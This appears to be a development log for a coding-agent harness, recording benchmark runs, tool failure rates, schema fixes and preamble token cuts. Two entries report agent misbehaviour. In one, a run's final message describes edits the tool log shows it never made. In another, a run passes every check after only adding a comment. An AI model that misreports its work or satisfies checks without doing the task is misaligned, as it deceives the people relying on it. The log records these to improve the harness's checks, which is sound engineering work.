Two turns is the floor for `h3`: one to call `rename`, one to answer. Both
runs cost $0.0000, which is true and temporary: both network tiers point at a free
alpha with no stated end date, and the risk list already carries what happens
when that ends. When it does, this change starts charging one hosted call per
finished run, and the question becomes whether a review that only sometimes
fires is worth that.

## 2026-08-21, the set on the tree as committed

The table above describes `a7af0d8` and stops there, so here is the same
sweep on `630d578`, which adds `delete`, the several-symbols form, the
widening fixes, and the reviewer on the balanced tier. One run per task,
`fast` pin, both columns:

| task | a7af0d8 | 630d578 |
|---|---|---|
| q1 | complete, 2t, 6,305, 1/2 | complete, 2t, 6,633, 1/2 |
| e1 | deadline, 5t, 16,114, 1/1 | complete, 4t, 13,802, 1/1 |
| e2 | stagnant, 7t, 28,024, 1/3 | deadline, 10t, 44,616, 3/3 |
| e3 | complete, 2t, 5,144, 3/3 | complete, 2t, 5,472, 3/3 |
| h1 | complete, 1t, 2,551, 0/3 | complete, 1t, 2,715, 0/3 |
| h2 | deadline, 4t, 13,781, 1/2 | stagnant, 7t, 32,839, 1/2 |
| h3 | complete, 6t, 17,026, 6/6 | complete, 2t, 5,465, 6/6 |
| h4 | - | complete, 4t, 11,679, 5/5 |

Over the seven tasks both sweeps share: checks 13 of 20 against 15 of 20,
review objections 2 against 0, turns 27 against 28, input tokens 88,945
against 111,542.

That is a quality gain and not a token gain. The token column is 25% worse,
and all of it sits in `e2` and `h2`. The first guess was variance, since
those two have the widest recorded spread, and the tool counts say otherwise.

Across the eight runs, `delete` was called only on `h4`, so the tenth tool is
not being reached for where it does not belong. What the expensive runs have
in common is that their edits are the kind no Modifier covers, and
`str_replace` failed 6 of the 10 times it was called:

- twice with arguments that were not valid JSON, which is the emission
  failure the Modifiers were built to remove, still intact on the work they
  do not cover
- twice with an `old_string` that did not match
- once repeating a call unchanged, once with no `path` at all

`h2`'s three `str_replace` calls all failed. So the extra tokens are retries
of a failing edit rather than noise, which is a better answer than the one
this entry first gave and points at the same place the shape table did:
block rewrites are 35% of edits and half the bytes, and they still go through
the surface the fast tier cannot emit into.

The claims that survive all of this: `h3` fell from 6 turns to 2, `e1`
finished instead of hitting its deadline, `e2` went from 1 of 3 checks to 3
of 3, nothing raised a false objection, and the tasks still routed through
`str_replace` got more expensive because it failed more than it worked.

## 2026-08-21, what the shell is actually used for

Every shell call in the thread logs, 278 of them, classified by what the
model was trying to find out:

| what it was doing | calls | share | result bytes |
|---|---|---|---|
| searching through `grep` | 106 | 38% | 59,027 |
| `go build` / `go test` | 46 | 17% | 36,442 |
| re-running gates already run | 37 | 13% | 12,999 |
| other | 37 | 13% | 49,112 |
| inspecting `jj` or `git` | 24 | 9% | 24,087 |
| reading a file through `sed`/`cat` | 17 | 6% | 18,830 |
| listing through `ls`/`find` | 11 | 4% | 6,951 |

Roughly 70% is work a deterministic tool either already did or could do with
no model turn at all. The interesting part is why the model reaches for a
shell when the tool exists.

Fourteen `grep` calls sampled at random say it plainly. Six use alternation
(`"ChoiceFast\|ChoiceBalanced\|ChoiceDeep"`, `"pinned\|activeModel\|Override"`),
most scope to named files or a directory, and several want a literal
identifier with line numbers (`grep -rn "edit\.ApplyToFile"`). The `search`
tool takes one fuzzy query across the whole project. It is not that the model
prefers the shell; it is that `search` cannot say what the model means.

Several also compose: `grep -n X f.go | head`, `grep A; sed -n B`,
`cmd && echo done`. One shell call does what three tool calls and three turns
would. That is the whole reason `read` and `list` work gets done through a
shell, and it argues for tools that accept several targets rather than for
more tools. `read` already takes comma-separated paths and `delete` now takes
comma-separated symbols; the pattern generalizes.

The `jj`/`git` slice is the clearest waste, because the answer is already
held. Every edit produces a `tool.Change` naming its file and the loop
accumulates them, while `Checkpointer` captures one operation id for a whole
run and nothing finer. Committing after each accepted change would make the
change log the record, make undo per-edit, and make those 24 calls pointless
because the harness can simply say what changed.

## 2026-08-22, the deterministic pass, and what a wider tool surface costs

Five roadmap items landed in one session: literal search, the gate-run answer,
per-edit checkpoints with the change set answered back, the standing goal, and
the `move` Modifier. Two of them are worth the numbers.

**Literal search, on this repo's own index.** The trigram FTS splits a fuzzy
query on non-word characters and ORs the halves, so a qualified identifier asks
for each half of itself. Against `.wavez/index.db` at 473 files:

| query | fuzzy | literal |
| --- | --- | --- |
| `edit.ApplyToFile` | 335 matches | 1 |
| `router.ChoiceFast` | 110 matches | 15 |

The literal path is the same FTS phrase query plus a case-sensitive filter in
Go, because the trigram tokenizer folds case. `CountMatches` runs the same
filter so a capped result set still reports a true total.

**Per-edit checkpoints need no commits.** jj snapshots the working copy on
every command, so capturing an operation id after each accepted change records
that edit's tree: restoring to one brings the file content back exactly as that
edit left it, at 40-70 ms per capture on this repo (434 files). Committing per
change would have added a description to write and a change-log entry per edit
and no recoverability the operation log does not already hold. That is the
second time this project has found the cheaper mechanism already present.

**The cost of the wider tool surface, measured against itself.** `h4` on the
fast pin, same task, same pin, before and after four tool changes:

| | 630d578 | e5e5231-fast |
| --- | --- | --- |
| turns | 4 | 4 |
| tool calls | 3 | 3 |
| checks | 5/5 | 5/5 |
| input tokens | 11,679 | 12,498 |

Nothing about the run changed; the extra 819 tokens (7%) are the preamble
growing by the `path` property, the literal mode's wording, and `move`'s
schema. The preamble went 2,527 → 2,584 → 2,560 (the CI half of the system
rule came out once the harness enforced it) → 2,767 with `move`. So a tool
that does not fire on a task still costs that task roughly a percent per
schema, and the case for each one has to be made on the tasks it does fire on,
which is exactly how `rename` and `delete` were judged.

**h2 stays unsolved and is not this session's doing.** Six lanes, six 1/2
results, always the same missing check: the model never adds the table case
proving blank-separated duplicates collapse. It is the one task in the set
whose failure is comprehension rather than tool surface.

**What is not yet observed in a real run.** The gate answer is unit-tested and
has not fired in a replay: `h5`'s run reached for `go build ./internal/guard/`
and `go vet ./internal/guard/`, both scoped to one package, which
`guard.ProjectCheck` deliberately lets through. A refusal needs a run that
edits and then sweeps the module, and none of the five tasks did that in the
lanes recorded here. The same is true of the change-set answer: no run in this
session called `jj` or `git`.

## 2026-08-22, a harness bug wearing a build failure

`h5` (move two functions into a new file, fast pin) passed all six checks on
its first tool call and then burned the rest of the run:

| lane | stop | turns | tool calls | checks | input tokens | elapsed |
| --- | --- | --- | --- | --- | --- | --- |
| move-tool | deadline | 15 (6f 9b) | 14 | 6/6 | 64,946 | 3m18s |
| move-atomic | verify_failed | 11 (4f 7b) | 8 | 6/6 | 45,979 | 3m12s |
| gate-pattern | complete | 2 (2f) | 1 | 6/6 | 6,049 | 32s |

Both runs did the whole task in call one (`move splitSequence, splitPipeline
-> internal/guard/sequence.go`) and both were then told by the `go-test` gate
that `internal/guard` failed to build, with "no output line named a changed
file, so run it yourself to see". The first run's final message invented a
story about copies left behind in `split.go`; the log shows no edit tool ran
after the move at all.

The first hypothesis was that `move` tore the tree: it cut from the source and
appended to the destination as separate writes, so a declaration briefly
existed in neither file. Making each file take exactly one write per call is a
real improvement and **it changed nothing** — `move-atomic` drew the identical
failure. That is what turned a plausible cause into a disproved one.

The real cause was in the gate. `fallbackPackages` guesses a changed file's
package as `path.Dir(ch.Path)` and `buildTestArgs` hands it to `go test`
unprefixed:

```
$ go test internal/guard
package internal/guard is not in std (…/go/1.26.6/src/internal/guard)
FAIL	internal/guard [setup failed]
```

The model copied that spelling out of the gate message and got the same error,
which is how it ended up believing the package was broken. The guess is only
reached when the import graph has no entry for a changed file, which means
**every newly created file** — so `move` and `write` hit it and `rename` and
`delete` never could. Fixed by spelling the fallback `./internal/guard`.

With the pattern fixed the task is one `move` call and a closing sentence:
two turns, one tool call, 6,049 input tokens against 45,979, entirely on the
local tier, 32 seconds against a three-minute deadline. Eleven turns and 40k
tokens were the model reacting to a message the harness should never have
sent.

Two things worth keeping from this. A gate that cannot attribute its own
failure should re-run rather than delegate, because a second of harness time
beat fourteen turns of model time here. And a model's account of what it did
is worth less than the tool log: the run that described a cleanup made no
edit call after its first one.

**The controls, and one contaminated row.** On the fixed tree `h4` is
unchanged (complete, 4 turns, 5/5) and `e2` matches its previous best
(complete, 13 turns, 3/3, 67,120 input tokens against 65,732), so the gate
fix cost nothing on tasks that never hit it. The first `e2` attempt recorded
2 turns, a deadline, and 68 output tokens in 180 seconds; it ran while
`hk check --all` and `go test ./...` were competing for the same laptop, so
it measures contention rather than the tree. It is kept as
`gate-pattern-contended` rather than deleted, because a lane that measures
the machine is worth being able to recognize later. Two rules follow: run a
replay on an idle laptop, and read output tokens per second before reading
turns, since a stall and a bad decision look the same in a turn count.

## 2026-08-23 — the progress line, and what the corpus refused

The `progress-estimate` spike finally ran on a corpus big enough to decide
anything: 138 thread logs on this laptop, 108 runs, 836 turn boundaries.
Two things came out of it, and the second is the one worth carrying.

The remaining run is not predictable. No estimator landed within a factor of
two more than a third of the time, and the two that read no history at all
(elapsed doubles, own mean turn) matched the three that read the project's,
so there is nothing to store. The conditional estimators buy their
within-2x share with a long tail and report a 1,511 s mean error doing it.

The turn is predictable enough to show: 54% within a factor of two at a
median error of 4.9 s, from the run's own mean gap and nothing else. So the
thread view renders `turn 4 · 12s of ~9s` and never a countdown.

The measurement trap is the carry-forward. The first pass scored whole
thread logs, which counts the minutes a thread waits for its human as work
the model is doing. On the same 138 logs that inflates the mean error
threefold (694.7 s against 221.4 s for the same estimator). A unit that
includes idle time measures the human.

## 2026-08-23 — web search, and the defense that does not depend on belief

Built `internal/web` plus `web_search` and `web_fetch`. The survey moved the
design: the plan was to mark fetched text untrusted and stop, and both the
field and the literature say a marker is the weakest layer. OpenCode's own
`webfetch` has no private-address check, no redirect rule, and no boundary,
and its injection defenses live in third-party plugins that pay a judge
model on every tool result.

So the deterministic layers went first and the marker went last: no
credential can ride on the request and a credential-shaped URL is refused
before anything is sent, a host resolving to a loopback or private address
is refused at dial time (checked in the dialer, so a name that resolves
differently the second time is caught too), a redirect may not change host,
the body is capped, and a host no search in this thread returned goes
through the permission gate.

Measured: the pair costs 221 preamble tokens, against the ~1,500 estimated
from the schema shape. The `web` toggle that turns them off therefore
matters much less than the question it was added to answer, and the general
lesson is that `wavez -preamble` answers in a second what a guess gets wrong
by 7x.

Not verified: no replay lane exercises the web tools, because no task in the
set asks a question about the world outside this repository. The live check
was a scratch test run by hand (DuckDuckGo returned five usable results for
"go 1.26 release notes" and the fetch reduced go.dev's release notes to
27 KB of clean text) and deleted rather than committed.

## 2026-08-23 — the edit failure rate was a hole in the schema

Item 2's taxonomy pointed at `str_replace`, so the 139 single-pair calls in
the 138 thread logs got classified by shape rather than by message. The
split is not the one the roadmap assumed. 52 of them carried no
`new_string` key at all, and every one came from the fast tier: `qwen3:8b`
sent 52 pairless calls and not a single well-formed pair, while the hosted
tiers sent 102 calls and never once dropped the field.

The cause is the tool's own schema. It declared `required: ["path"]`,
because a flat required list cannot say "either the pair or `edits`", so
`old_string` and `new_string` were optional. A local turn decodes tool
arguments under a grammar compiled from that schema, which is measurable
rather than assumed: an `enum` sentinel placed in the schema came back in
the emitted call, so `required` binds at decode time. The optionality is
therefore a legal exit right after `old_string`. When the model's quoting
slipped mid-anchor it was not blocked, it closed the object and sent a
complete, valid, useless call, which is where the `', ` and `”, ` tails in
those anchors come from.

Measured against `llama-server` on `qwen3:8b`, asked for a path-only call:

| schema | pairless call accepted |
|---|---|
| `required: ["path"]` | 6 of 6 |
| `anyOf` beside `properties` | 6 of 6 |
| top-level `oneOf` of two whole branches | 0 of 5 |

The middle row is the one worth keeping: an `anyOf` written next to
`properties` is ignored, so alternatives only bind as whole objects. Under
the shipped `oneOf` the grammar forces both fields 8 times out of 8 over
streaming even when the prompt asks for them to be left out, and the
`edits` branch still gets chosen when the task needs two changes (5 of 5).

The second half is a correctness fix and stands on its own. Absence was
read as an empty string, so a call cut short deleted its anchor: one logged
run dropped a README line and reported `+0 -1 lines` as a change. An absent
`new_string` is now refused, and a deletion is spelled `""`.

Cost: the preamble's `str_replace` schema grows 1,270 bytes to 1,518, so
the fixed prefix goes from 2,967 to 3,029 tokens, 41% to 42% of what a fast
turn can use.

Not verified: no replay lane has been run against this. The A/B above is
the enforcement measurement, not a task measurement, and what it cannot say
is how many turns the 19 affected threads get back. The corpus rate (52 of
52 fast-tier calls) is the estimate to check the next lane against.

## 2026-08-23 — re-aiming item 2, and the log that hid the rest

With the pairless class named, the 85 logged `str_replace` failures got
re-counted by call shape. 51 of them (60%) are that one hole: 32 of the 40
`old_string` not found errors were pairless calls rather than anchors that
missed, and 19 of the 22 refused repeats were repeats of a pairless call.
So the roadmap's three problems (text matching, a loop that repeats, a tier
that cannot emit JSON) were one problem wearing three masks, and what is
actually left is 6 genuine anchor misses, 13 malformed emissions, 6 hosted
`edits` calls with no path, 3 identical pairs, 3 repeats of a complete
call, and 1 ambiguous match.

Corroboration worth keeping: all 6 path-less calls came from the hosted
tiers and none from the fast tier. The hosted tiers do not decode under the
grammar and the fast tier does, so the one field the old schema did require
was the one the grammar-decoded tier never dropped.

The malformed 13 could not be classified at all, because the thread log
bounded every tool input at 2000 characters and all 13 were longer. A
failed call's arguments are the whole evidence for why it failed, so that
bound now applies only to a call that succeeded, where the change is the
record. A failure keeps 32 KB, which is enough to hold a degenerate
emission's tail, and the event log's reader already allows 8 MB a line.

Not verified: the 13 stay unclassified until runs recorded under the new
bound exist. This buys the next classification pass rather than answering
this one.

## 2026-08-23 — two e2 lanes, and what they did and did not settle

Ran `e2` twice on the fast tier against the schema fix. Neither run passed,
and neither is evidence that the fix helped the task: `pair-required`
stopped stagnant at 8 turns with 1 of 3 checks, `batch-one-file` stopped
loop_detected at 9 turns with the same 1 of 3. The recent baselines for
this task are stagnant at 7 turns, deadline at 10, and complete at 13, so
both runs sit inside the band this set varies over and an A/B this size is
noise by the rule in [Dogfooding](../../DESIGN.md#dogfooding).

What is settled, because it does not depend on the model's path: no call in
either run was pairless, against 52 of 52 fast-tier calls before. The first
lane's three `str_replace` calls all came back as complete pairs with a
`no_match` cause and no escalation, so the failure moved from a lost field
to a wrong anchor rather than going away.

The tool log then paid for the logging change twice over, and both findings
were invisible under the old 2000-character bound.

The first: `e2` needs two files, and `edits` is per file. The model sent one
batch of three edits with `path` set to memory.go while two of them
anchored in memory_test.go, and the error said only "old_string not found
in source", which names nothing to change, so it resent the same call until
the stagnation bound stopped the run. A failed batch now says every edit
applies to that one path. The re-run did not turn that into a pass, so the
message is a correct thing to say and not a fix for this task.

The second: the malformed emission class has a shape. `batch-one-file`'s
seq 10 is 8,765 characters and ends mid-array, so a malformed call here is
the model trying to write an entire multi-file batch in one argument and
being cut off, rather than a degeneration loop. Against an 8k window that
one argument is roughly 2,200 tokens. That points at the size of what the
tool asks the model to emit, which is the argument for a per-edit `path`
and against larger batches, and it is the first direct evidence for either.

One defect this found in the fix itself: the hosted tier sent `{}` twice,
and the absent-`new_string` message fired on a call whose path was missing
too, naming the later absence first. `shapeError` now defers to the path
check when there is no path. Worth keeping in view: the hosted tiers are
not grammar-constrained, so the tool-level check is what holds the shape
there, which is why both halves of the fix exist.

## 2026-08-23 — smaller batches, measured and dropped

The multi-file batch that failed `e2` suggested capping how much one
`str_replace` call may carry. Measured over the 217 logged calls before
building it, and the hypothesis does not survive.

Batch count does not predict failure: 1 edit fails at 39%, 2 at 40%, 3 at
57% on 7 calls, and every 4-edit batch landed. Argument size does, but only
at first glance: the 21 calls stored at the old 2000-character bound fail
at 71% against 39% for the rest, and insertions, which are the large
structured calls, fail at 10% against 42% overall. Their repeated anchor is
20% of their bytes, so an insert mode that skipped it would save a fifth of
the bytes on the calls that already work.

Splitting those 21 by compression ratio separates two failures that were
one number. Five are degeneration loops, ratio at or below 0.052, one
phrase repeated to the token limit, and all five failed. The other sixteen
are normal-entropy code, six of which landed. So there is no size threshold
to cap at, and a cap is the wrong shape of fix regardless: requiring the
pair worked because the grammar forced more correctness at no cost to a
legitimate call, while `maxItems` or `maxLength` would forbid legitimate
large edits to discourage a failure that is mostly not about size.

What it leaves: the degeneration class is small (5 of 217) and detectable
in one line, and wavez sends no sampling parameters at all, so
llama-server's defaults decide repetition. That is where the class would be
attacked, and it is unmeasured.

Not verified: every number here reads a corpus recorded under the old
2000-character bound, so the true size of the largest 10% is unknown and
the failure rates for them are lower bounds on nothing in particular. Reads
of this table after runs accumulate under the new bound should redo it
rather than cite it.

## 2026-08-23 — e2 is outside the fast tier, so it cannot measure a fast-tier change

Reading `tier_turns` across every recorded `fast`-pinned run settles a
question the last three lanes kept tripping over. No `e2` run has ever
completed without the hosted tier. All seven completions spent most of
their turns on `balanced`, and all four fast-only attempts failed:
`fast-remit` malformed at 2 turns, `fast-retry` stagnant at 6,
`gate-pattern-contended` deadline at 2, and `pair-required` stagnant at 8.

That invalidates the comparison drawn in this file earlier today. The
`pair-required` lane ran 8 of 8 turns on the fast tier and was set against
a 13-turn baseline that spent 6 of its turns on `balanced`. Among fast-only
`e2` runs the record is 0 of 4 on both sides of the change, so the lane
says nothing about the fix in either direction. What it does say stands
without it: no call in the run was pairless.

The pattern holds across the set and matches [Standing
objectives](../../DESIGN.md#standing-objectives) on asking a tier only what
it can do. `q1` retrieves an answer and completes fast-only in 2 or 3 turns
every time. `h2` has never completed at all. `e2` needs the hosted tier.

The counter-example is the one worth building on. `e3` needed escalation
before `rename` existed, at 16, 14, and 18 turns with `balanced` and `deep`
carrying them, plus a 35-turn deadline. After `rename` it completes in 2
turns entirely on the fast tier, twice over. The Modifier did not make the
model better at the task, it turned the task into one call the model could
emit.

Two things follow for how this set gets used. A fast-tier tool change
measured against a task the fast tier cannot do measures nothing, so the
baseline for such a lane has to be a fast-only run of the same task or a
task the tier can finish. And the case for a Modifier is not the bytes it
saves but whether it moves a task inside the tier's remit, which is what
`e3` demonstrates and what any new one should be measured against.

## 2026-08-23 — degeneration has a cause and a fix, and h6 still fails most of the time

`h6` was written as a fast-tier baseline for a declaration-replace Modifier
and immediately measured something else. The baseline run died emitting
15,544 characters of one repeated sentence, so the lane could not have
measured a tool change at all.

Sizing it across every thread log: 7 of 128 tool arguments over 400 bytes
are degenerate by compression ratio, and 0 of 39 prose turns are. The gap is
clean, 0.037 to 0.056 and then nothing until 0.175. All 7 are on the fast
tier, all in `str_replace`, 4 of 7 killed their run, and 5 of 7 struck at
the run's first tool call. Length does not explain the split: the two
distributions match to p90 (2001 against 1934 bytes) and 6 prose turns over
1500 bytes came through clean.

The cause is that nothing was bounding it. llama.cpp disables every penalty
by default (`repeat-penalty 1.00`, `presence-penalty 0.00`,
`frequency-penalty 0.00`) and wavez sent none of them. The hypothesis for
why it lands in arguments and not prose, unproven and worth holding
loosely: a grammar-constrained JSON string has no stop token to reach, so a
turn that starts repeating inside one runs to the context limit, where free
text can simply end.

Measured on `h6`, one run each:

| lane | ratio | largest call | tiers | stop |
|---|---|---|---|---|
| none | 0.037 | 15,544 | 3f 2b | stagnant, 5 turns |
| presence 1.5 | 0.271 | 1,186 | 6f | stagnant, 6 turns |
| repeat 1.1 | 0.405 | 828 | 6f 1b | stagnant, 7 turns |

Both bound it and one run each cannot separate them, so `presence` ships on
Qwen3's own guidance and because it penalizes a token once rather than per
occurrence, which is what code full of tabs and `err` needs.

Underneath the degeneration was a milder form of the same thing. Freed of
it, runs began sending the same edit pair several times in one batch: five
identical pairs in one run, two in the next. Naming the repetition in the
error did not stop it, which is the standing objective's own point about
asking a model not to do something. An exactly repeated pair is
unambiguous, so `str_replace` now applies it once, and refuses only the
undecidable case where one anchor carries two different replacements.

What none of this bought: a pass rate. Across 6 penalty runs of `h6`, 2
reached 4 of 4 checks and 1 stopped `complete`. The failures moved rather
than stopped, which is progress in kind and not in outcome: the baseline
never landed an edit at all, and the later runs land the edit and then miss
the `utf8` import, or finish the work and fail to notice. At 3 runs a
configuration none of the differences between the penalty lanes are
readable, and this file should not be read as saying otherwise.

One harness observation to follow up separately: `collapse-repeats` run 3
passed all 4 checks and still stopped `loop_detected`, so the run did the
work and the loop did not recognize it. That is the question item 16's
finish check exists to answer.

## 2026-08-23 — the precursors, found by counting what the h6 runs wasted

With degeneration bounded, the 8 `h6` runs make a readable corpus: 64 tool
calls, 27 of them (42%) wasted. The split says where the turns go.

| wasted | cause |
|---|---|
| 6 | `search` returned nothing |
| 5 | refused repeat |
| 5 | anchor missed |
| 3 | call with no path |
| 3 | `old_string` equal to `new_string` |
| 2 | malformed arguments |
| 2 | duplicate edits in a batch |
| 1 | `read` past the end of the file |

The largest class is retrieval and it is not what it looked like. Every one
of the 6 failures used `mode=literal`, and the queries were descriptions:
"truncate function in internal/thread/thread.go". Literal matches an exact
substring, so those correctly match nothing, while all three literal
searches naming one identifier landed. The mode shipped under item 11 and
the model over-applies it. A literal query carrying whitespace that returns
nothing is now retried as fuzzy and the answer says so, which is the shape
`searchWidening` already uses for symbol lookups. A literal phrase that
does match is still answered as asked, since only an empty result retries.

The no-op edits were costing more than they looked. Three runs sent one
real edit beside a second replacing text with itself, and the batch is
atomic, so all three landed nothing at all. A no-op cannot change a file,
so it is now dropped and the rest of the batch applies; a batch of nothing
but no-ops still fails, because it asked for nothing.

The 3 pathless calls all came from the hosted tier on a run already
failing, and the message names the missing field. Nothing at the tool layer
prevents them.

Not verified: none of this has been measured on a lane yet. The counts say
what was wasted, not what removing the waste buys, and `h6` varies enough
that a rate needs more runs than the fixes have had.

## 2026-08-23 — the run that did the work and stopped anyway

Item 16 exists because the model reviewer objects to correct diffs. The
`h6` lanes turned up the opposite failure and it needs no model at all: a
run stopped `loop_detected` with every one of its 4 checks passing and the
gates passing on what it had written.

The trace says why it kept going. The edit landed on turn 6 and used
`utf8` without importing it, the gates said so, and the model then spent
six turns trying to establish whether it had fixed that. It read the import
block, tried `go build`, and was refused by the guard with "they ran on
your changes and failed, and you were told what they found" (true, and
stale, since no accepted change had happened since). Its next edit arrived
with no path and loop detection ended the run.

The disagreement is the part worth keeping: the last gate feedback the
model saw said the build was broken, and the end-of-run verification on the
same change set passed. One of them is stale and the tree that would settle
it had already been deleted, because the replay harness removes its
workspace on the way out. So a run now keeps its workspace whenever a check
fails, and says where it is.

The deterministic half of the finish check ships as the smallest thing that
distinguishes these cases: `Outcome.GatesPassedAtEnd` records whether the
gates passed on the change set of a run that stopped on a bound. A run that
hit a bound with the tree building and its tests passing is not the same
outcome as one that left it broken, and both read as `failed` today.

Not verified: nothing yet reads `GatesPassedAtEnd`, so this is the signal
and not yet the report. Whether the guard should let a model re-check a
build when the gates have nothing new to run on is open, and is the thing
that actually cost this run its six turns.

## 2026-08-23 — the precursors measured, and what is left

Three `h6` lanes with the search fallback, the no-op drop, and the repeat
collapse in place. Every recorded `h6` run to date:

| lane | complete | runs |
|---|---|---|
| baseline-str-replace | 0 | 1, stagnant at 5 turns, escalated |
| presence-1.5 | 0 | 1, stagnant at 6 |
| repeat-1.1 | 0 | 1, stagnant at 7 |
| presence-plus-dupe | 1 | 2 |
| collapse-repeats | 0 | 3, one passing 4 of 4 as loop_detected |
| precursors | 2 | 3, both completions at 6 turns and entirely on the fast tier |

Two completions at the same turn count on the same tier is the first result
here that looks like a task the fast tier can do rather than one it
sometimes survives. It is still 3 runs, and the whole set is 3 completions
in 11, so this is a direction and not a rate.

The kept workspace earned itself on its first failure. The run left
`truncate` untouched, which settles "it edited the wrong thing" against
"it never edited at all" without inferring anything from the log.

That run also names what is left, and it is not degeneration. Its malformed
call is 1,959 characters at a compression ratio of 0.241, well clear of the
degenerate band, and it ends mid-expression: `s[i-2] == 0x8, s[i`. An
emission cut off partway through with normal entropy is a different failure
from one that repeated itself to the limit, and the likely cause is the
fast tier running out of its 8k window mid-argument rather than anything
about repetition. Nothing here measures that, and the fix for it would sit
with the payload work in item 3 rather than with sampling.

## 2026-08-23 — twelve lanes off the roadmap, and what none of them measured

Twelve items taken in the roadmap's own order. Every one is deterministic
and none of them needed a model, so no replay lane ran and none of the
numbers below came from one. That is the honest limit of this session: the
measurement got much better and nothing has been measured with it yet.

**What shipped.** The guard repeats what the gates found instead of
pointing at a past turn (the six turns one `h6` run lost). Transcript
fixtures (`internal/transcript`) replay a frozen run's turns against the
real loop and diff a golden frame. Gate false alarms are recorded when a
gate passes over the change set it just failed over. `-stats-corpus`
reports the rates across `records.jsonl`. Turn attribution splits a run
into productive, retrieval, harness, and prose. The four finish checks
(`internal/finish`) run when a run completes. Undo reaches one edit rather
than only the whole run. A prompt sent mid-turn queues, and `ctrl+g`
interrupts. `-preamble-max` fails over a ceiling.

**One number that came out of it.** The preamble is 3,029 tokens, 42% of
what a fast turn can use. DESIGN.md recorded 2,633 when the audit ran, so
it has grown 15% since, and nothing was watching. The ceiling is set at
3,100 for that reason.

**What the corpus says now that it can be asked.** `-stats-corpus` over 90
runs: 46% ended complete, 73% of 268 checks held, and `str_replace` failed
106 of 173 calls against `read` at 3 of 160 and `search` at 0 of 67. The
causes cover 28 of `str_replace`'s 106, because the taxonomy reached the
call sites gradually, and the report says so rather than presenting a
partial breakdown as a whole one.

**Not verified.** No lane ran, so nothing here has a before and after.
Four things are worth reading first once one does: whether gate false
alarms are nonzero at all, whether harness turns are the share the item-11
numbers imply, whether `FinishFindings` fires on runs that completed, and
whether the guard's repeated failure shortens a run that used to spend
turns re-checking. All four are now one command rather than a script.

## 2026-08-23 — where the preamble actually goes

The question was whether the preamble could be dynamic, minimal with
load-on-demand, or folded into the tools. Measuring it first answered all
three differently than expected.

**It is already folded into the tools, and it is mostly prose.** Of 3,029
tokens: 200 system rules, 294 project context, and 2,535 (84%) the tool
surface. Splitting each schema into its descriptions and the structure they
hang on puts 2,085 of those in prose and 448 in structure. So the preamble
is not schema, it is teaching, at 69% of the tool surface.

**Dynamic is the wrong shape, and the corpus says why.** Over 87 runs, 77%
of all input tokens are served from the provider's prefix cache, 79% on the
43 fast-only runs. The preamble is the head of that prefix. Narrowing it
mid-thread re-evaluates everything after the change, and saving 1,000
tokens a turn does not pay for re-evaluating a 20k-token history once.
Choosing the tool set once at thread creation costs nothing, which is what
`registry.Only` already does for plan mode.

**Load-on-demand was already ruled out and this does not reopen it.** The
one controlled benchmark on record says reduction that costs a follow-up
call moves the spend rather than removing it. The variant that costs no
turn is different and is what shipped: prose that only says what a failure
will say moves into the failure, which is paid once when the mistake
happens rather than on every turn of every thread.

**What that bought.** 3,029 to 2,736 tokens on the prose cut, then 2,516
after defaulting the web pair off. 42% of a fast turn's usable window down
to 35%, with the schema structure untouched at 448 tokens both times,
because structure is the grammar a fast turn decodes under and is not
teaching.

**The four tools never called in 90 runs** are `question`, `write`,
`web_search`, and `web_fetch`. Only the web pair was removed. `question` is
named in the instruction the loop gives a run that asks in prose, and
`write` is how a file gets created; dropping either would break something
the harness says. That is the limit of this evidence: the replay set is
edit-shaped work on one repo with no network need, so 0 calls means those
tools are dead weight on this task set, not that they are useless.

**Not verified.** No replay lane ran. The prose cut is exact on tokens and
unmeasured on behavior: the risk it takes is that the first occurrence of
each mistake now costs a turn where the schema used to prevent it.
`str_replace`'s failure rate (106 of 173 calls in the corpus) is the number
to read after the next lanes, and if it rises, the cut clauses are named in
`TestTheErrorsCarryWhatTheSchemasStoppedSaying` and go back one at a time.

## 2026-08-23 — the preamble is not one number

Asked why the preamble has to be long, and whether merging tools or
narrowing it would help. Two measurements moved the answer.

**It was long because the harness was not checking.** The single largest
entry was the Go conventions section at 294 tokens, and most of it named
rules `golangci-lint` enforces. It was there because nothing else said
them: `FormatGate` runs `golangci-lint run --fix` and discards the exit
status, so an autofixable finding was silently corrected and every other
one reached nobody until CI. A `lint` gate now reports the findings on a
run's own changed files, and the injected section is 113 tokens. The full
list stays in AGENTS.md for a human; `.wavez.pkl` points the model at a
project-owned section holding only what no gate answers.

**The same prefix is not the same cost.** 2,119 tokens is 30% of what a
fast turn can use and 1.8% of a hosted one, an 18x difference for identical
content. The tiers are served by different processes and keep separate
prefix caches, so a per-tier surface costs nothing, where narrowing
mid-thread would invalidate the 77% of input tokens the cache serves. The
fast tier is now shown a narrower set, and `-preamble` reports a line per
tier.

**Where it went, start to now.** 3,029 tokens to 2,119 on the fast tier,
42% of the window to 30%.

| lane | fast tokens |
|---|---|
| start | 3,029 |
| prose the failure already carries | 2,736 |
| web tools off by default | 2,516 |
| lint gate, conventions trimmed | 2,335 |
| fast tier shown a narrower surface | 2,119 |

**The one judgment call on thin evidence** is which tools the fast tier is
not shown. `shell` was called twice in the 43 runs that stayed on the fast
tier and 97 times in the 44 that escalated, and `write` was called by
nothing at all in 90 runs. The confound is that a run escalates because it
was hard, so the split may be about the tasks rather than the tier. It is
one list (`app.FastTierOmits`) and reverting is a one-line change.

**Not verified.** Still no replay lane. Two risks are now outstanding
together: the prose cut moves a first mistake's cost from the schema to a
turn, and the narrower fast surface moves an omitted tool's cost to an
escalation. Both show up in the same numbers, so the next lane has to read
`str_replace`'s failure rate and the fast-only completion rate side by
side, and the two changes come apart cleanly if it goes the wrong way.

## 2026-08-23 — the lanes, and what they said about seventeen unverified changes

Seventeen lanes had shipped with no replay behind them. The first thing the
lanes changed was the method: every replay was paying a cold model load,
because the harness starts llama-server and stops it with the run. Holding
one warm (same flags as `runtime.buildArgs`) cut a lane from ~3 minutes to
47-115 seconds and removed the confound. The first cold lane recorded 2.7
tok/s, the slowest of all twelve `h6` runs on record, and is relabelled
`lean-preamble-cold` as evidence about the method rather than the tree.

**The preamble work did not break anything, and did not fix anything.** Six
`h6` lanes on the lean preamble: 2 of 6 did every check, against 3 of 11
before. That is noise at this sample, which is the answer that mattered:
seventeen changes including a 30% preamble cut left the task's success rate
where it was.

**The risk I flagged from the prose cut is retired.** Of 25 failed
`str_replace` calls across the lean lanes, not one was a line-numbered
anchor, which is the class the cut prose warned about.

**A run completed with every gate green having done nothing.** It added the
line `// Ensure we truncate on a character boundary` above the code it was
asked to rewrite and changed nothing else. All four finish checks passed it:
the change set touched the file the task named, the answer named only things
